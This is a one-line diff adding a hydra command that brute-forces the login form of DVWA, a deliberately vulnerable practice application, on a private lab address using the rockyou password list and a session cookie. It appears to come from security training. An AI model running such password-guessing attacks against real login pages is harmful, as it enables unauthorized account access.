@@ -1,0 +1,1 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.12.130 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=eab2f080540b908c7991b816a25d897c;security=low:F=Username and/or password incorrect"
